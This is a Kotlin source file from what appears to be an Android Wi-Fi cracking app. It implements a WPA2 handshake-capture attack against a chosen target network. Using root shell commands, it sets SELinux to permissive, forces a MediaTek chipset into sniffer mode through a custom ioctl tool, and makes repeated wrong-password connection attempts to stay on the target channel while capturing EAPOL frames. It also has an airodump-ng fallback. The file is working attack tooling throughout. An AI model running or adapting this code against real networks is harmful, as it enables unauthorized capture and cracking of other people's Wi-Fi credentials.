package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.BinaryInstaller
import com.wificracker.core.root.ShellExecutor
import com.wificracker.core.wifi.ChipsetMonitorHelper
import com.wificracker.core.wifi.WifiChipVendor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class HandshakeCapture @Inject constructor(
    private val shellExecutor: ShellExecutor,
    private val binaryInstaller: BinaryInstaller,
    private val chipsetMonitorHelper: ChipsetMonitorHelper,
) : WifiAttack {
    companion object {
        private const val CAPTURE_DIR = "/data/local/tmp/wificracker/captures"
        private const val DIR = "/data/local/tmp/wificracker"
        private const val MAX_ATTEMPTS = 15
        private const val ATTEMPT_DELAY_MS = 8000L
        private const val CAPTURE_SECONDS = 180
    }

    override fun execute(attack: Attack): Flow<String> = flow {
        shellExecutor.executeAsRoot("mkdir -p $CAPTURE_DIR")
        val chipInfo = chipsetMonitorHelper.detectChipVendor()

        if (chipInfo.vendor == WifiChipVendor.MEDIATEK && chipInfo.patchInstalled) {
            executeMtkCapture(attack)
        } else {
            executeStandardCapture(attack)
        }
    }.flowOn(Dispatchers.IO)

    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeMtkCapture(attack: Attack) {
        val captureFile = "$CAPTURE_DIR/hs_${attack.targetBssid.replace(":", "")}_${System.currentTimeMillis()}.bin"

        emit("[*] MTK ICS handshake capture — target: ${attack.targetSsid} (${attack.targetBssid})")

        // Step 0: SELinux permissive
        shellExecutor.executeAsRoot("setenforce 0")
        emit("[*] SELinux permissive")

        // Step 1: Activate SNIFFER via ioctl 0x8BE5 (bypasses dispatch table)
        emit("[*] Activating SNIFFER via ioctl 0x8BE5...")
        shellExecutor.executeAsRoot("$DIR/sniffer_direct wlan0 \"SNIFFER 2 0 0 0 0 0 0 0 0 0\"")

        // Step 2: Start ICS capture in background
        emit("[*] Starting ICS capture (${CAPTURE_SECONDS}s)...")
        shellExecutor.executeAsRoot("nohup $DIR/ics_enable 2 1 $CAPTURE_SECONDS > $captureFile 2>/dev/null &")
        delay(2000)

        // Step 3: Loop — connect with wrong password to lock on channel + capture EAPOL
        // The connection attempt puts the driver on the target channel.
        // The AP sends M1 (ANonce) during auth. When third-party devices
        // reconnect, we capture their full M1+M2 handshake.
        emit("[*] Starting connection attempts to lock on-channel...")
        var eapolFound = false

        for (attempt in 1..MAX_ATTEMPTS) {
            emit("[*] Attempt $attempt/$MAX_ATTEMPTS — connecting to ${attack.targetSsid}...")

            // Connect with wrong password — triggers M1 exchange
            shellExecutor.executeAsRoot(
                "cmd wifi connect-network \"${attack.targetSsid}\" wpa2 \"wrong_pass_attempt_${attempt}\" 2>/dev/null",
            )

            delay(ATTEMPT_DELAY_MS)

            // Check capture size
            val sizeResult = shellExecutor.executeAsRoot("wc -c < $captureFile 2>/dev/null")
            val bytes = sizeResult.stdout.trim().toLongOrNull() ?: 0
            emit("    Captured: ${bytes / 1024} KB")

            // Quick EAPOL check (look for LLC/SNAP 88:8E pattern)
            val eapolCheck = shellExecutor.executeAsRoot(
                "grep -c '\\x88\\x8e' $captureFile 2>/dev/null || echo 0",
            )
            val eapolCount = eapolCheck.stdout.trim().toIntOrNull() ?: 0
            if (eapolCount > 0) {
                emit("[+] EAPOL frames detected ($eapolCount)!")
                eapolFound = true
            }
        }

        // Step 4: Stop capture
        emit("[*] Stopping capture...")
        shellExecutor.executeAsRoot("pkill -f 'ics_enable' 2>/dev/null")
        delay(1000)
        shellExecutor.executeAsRoot("$DIR/ics_enable 0 0")

        // Step 5: Report results
        val finalSize = shellExecutor.executeAsRoot("wc -c < $captureFile 2>/dev/null")
        val totalBytes = finalSize.stdout.trim().toLongOrNull() ?: 0
        emit("[+] Capture complete: $captureFile (${totalBytes / 1024} KB)")

        if (eapolFound) {
            emit("[+] EAPOL handshake frames captured!")
            emit("[+] Parse with: mtk_parse_handshake.py $captureFile ${attack.targetSsid}")
        } else {
            emit("[!] No EAPOL detected. A third-party device needs to reconnect during capture.")
            emit("[!] Re-run with longer duration or ask someone to reconnect their WiFi.")
        }
    }

    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeStandardCapture(attack: Attack) {
        // Standard path: airodump-ng (requires monitor mode + USB adapter)
        val outputPrefix = "$CAPTURE_DIR/hs_${attack.targetBssid.replace(":", "")}_${System.currentTimeMillis()}"
        val binary = binaryInstaller.getBinaryPath("airodump-ng")
        emit("[*] Capturing handshake via airodump-ng on ${attack.interfaceName}...")
        val cmd = "$binary --bssid ${attack.targetBssid} --write $outputPrefix --output-format pcap ${attack.interfaceName}"
        shellExecutor.executeAsRoot(cmd, timeoutSeconds = 120)
        emit("[+] Capture saved to $outputPrefix")
    }

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill -f 'ics_enable' 2>/dev/null")
        shellExecutor.executeAsRoot("$DIR/ics_enable 0 0 2>/dev/null")
        shellExecutor.executeAsRoot("pkill -f 'airodump-ng.*${attack.targetBssid}' 2>/dev/null")
    }
}
